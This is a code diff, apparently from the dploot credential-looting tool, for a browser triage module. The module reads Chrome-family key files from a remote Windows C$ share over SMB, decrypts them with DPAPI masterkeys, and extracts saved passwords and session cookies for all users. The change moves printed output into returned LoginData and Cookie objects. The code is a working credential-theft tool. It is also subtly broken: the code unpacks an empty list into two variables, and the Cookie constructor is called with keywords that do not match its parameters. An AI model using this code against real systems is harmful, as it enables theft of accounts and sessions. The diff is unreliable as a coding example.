@@ -4,13 +4,53 @@ import logging
 import ntpath
 import tempfile
 import sqlite3
-from typing import List
+from typing import List, Tuple
 from dploot.lib.crypto import decrypt_chrome_password
 
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.lib.utils import datetime_to_time
+from dploot.triage.masterkeys import Masterkey
+
+class LoginData:
+    def __init__(self, winuser: str, browser:str, url:str, username:str, password:str):
+        self.winuser = winuser
+        self.browser = browser
+        self.url = url
+        self.username = username
+        self.password = password
+
+    def dump(self) -> None:
+        print('[%s LOGIN DATA]' % self.browser.upper())
+        print('URL:\t\t%s' % self.url)
+        print('Username:\t%s' % self.username)
+        if self.password is not None:
+            print('Password:\t%s' % self.password)
+        print()
+
+class Cookie:
+    def __init__(self, winuser: str, browser:str, host:str, path: str, cookie_name:str, cookie_value:str, creation_utc:str, expires_utc:str, last_access_utc:str):
+        self.winuser = winuser
+        self.browser = browser
+        self.host = host
+        self.path = path
+        self.cookie_name = cookie_name
+        self.cookie_value = cookie_value
+        self.creation_utc = creation_utc
+        self.expires_utc = expires_utc
+        self.last_access_utc = last_access_utc
+
+    def dump(self) -> None:
+        print('[%s COOKIE DATA]' % self.browser.upper())
+        print('Host (path):\t\t%s (%s)' % (self.host,self.path))
+        print('Cookie Name:\t\t%s' % self.cookie_name)
+        if self.cookie_value is not None:
+            print('Cookie Value:\t\t%s' % self.cookie_value)
+        print('Creation UTC:\t\t%s' % datetime_to_time(self.creation_utc))
+        print('Expires UTC:\t\t%s' % datetime_to_time(self.expires_utc))
+        print('Last Access UTC:\t%s' % datetime_to_time(self.last_access_utc))
+        print()
 
 class BrowserTriage:
 
@@ -32,7 +72,7 @@ class BrowserTriage:
 
     share = 'C$'
 
-    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list) -> None:
+    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
         self.target = target
         self.conn = conn
         
@@ -41,25 +81,29 @@ class BrowserTriage:
         self.looted_files = dict()
         self.masterkeys = masterkeys
 
-    def triage_browsers(self) -> None:
-        logging.info('Triage Browser Credentials and Cookies for ALL USERS')
+    def triage_browsers(self) -> Tuple[List[LoginData], List[Cookie]]:
+        credentials, cookies = list()
+
         for user in self.users:
             try:
-                self.triage_browsers_for_user(user)
+                user_credentials, user_cookies=self.triage_browsers_for_user(user)
+                credentials += user_credentials
+                cookies += user_cookies
             except Exception as e:
                 print(str(e))
                 pass
-        print()
+        return credentials, cookies
 
-    def triage_browsers_for_user(self, user: str) -> None:
-        self.triage_chrome_browsers_for_user(user=user)
+    def triage_browsers_for_user(self, user: str) -> Tuple[List[LoginData], List[Cookie]]:
+        return self.triage_chrome_browsers_for_user(user=user)
 
-    def triage_chrome_browsers_for_user(self,user:str) -> None:
+    def triage_chrome_browsers_for_user(self,user:str) -> Tuple[List[LoginData], List[Cookie]]:
+        credentials, cookies = list()
         for browser,paths in self.user_generic_chrome_paths.items():
             aeskey = None
             aesStateKey_bytes = self.conn.readFile(shareName=self.share, path=paths['aesStateKeyPath'] % user)
             if aesStateKey_bytes is not None and len(aesStateKey_bytes) > 0:
-                logging.info('Found %s AppData files for user %s' % (browser.upper(), user))
+                logging.debug('Found %s AppData files for user %s' % (browser.upper(), user))
                 aesStateKey_json = json.loads(aesStateKey_bytes)
                 blob = base64.b64decode(aesStateKey_json['os_crypt']['encrypted_key'])
                 if blob[:5] == b'DPAPI':
@@ -81,12 +125,12 @@ class BrowserTriage:
                 if len(lines) > 0:
                     for url, username, encrypted_password in lines:
                         password = decrypt_chrome_password(encrypted_password, aeskey)
-                        print('[%s LOGIN DATA]' % browser.upper())
-                        print('URL:\t\t%s' % url)
-                        print('Username:\t%s' % username)
-                        if password is not None:
-                            print('Password:\t%s' % password)
-                        print()
+                        credentials.append(LoginData(
+                            winuser=user, 
+                            browser=browser, 
+                            url=url, 
+                            username=username, 
+                            password=password))
                 fh.close()
 
 
@@ -103,16 +147,18 @@ class BrowserTriage:
                 if len(lines) > 0:
                     for creation_utc, host, name, path, expires_utc, last_access_utc, encrypted_cookie in lines:
                         cookie = decrypt_chrome_password(encrypted_cookie, aeskey)
-                        print('[%s COOKIE DATA]' % browser.upper())
-                        print('Host (path):\t\t%s (%s)' % (host,path))
-                        print('Cookie Name:\t\t%s' % name)
-                        if cookie is not None:
-                            print('Cookie Value:\t\t%s' % cookie)
-                        print('Creation UTC:\t\t%s' % datetime_to_time(creation_utc))
-                        print('Expires UTC:\t\t%s' % datetime_to_time(expires_utc))
-                        print('Last Access UTC:\t%s' % datetime_to_time(last_access_utc))
-                        print()
+                        cookies.append(Cookie(
+                            winuser=user,
+                            browser=browser,
+                            host=host,
+                            path=path,
+                            name=name,
+                            cookies=cookie,
+                            creation_utc=creation_utc,
+                            expires_utc=expires_utc,
+                            last_access_utc=last_access_utc))
                 fh.close()
+        return credentials, cookies
 
     @property
     def is_admin(self) -> bool:
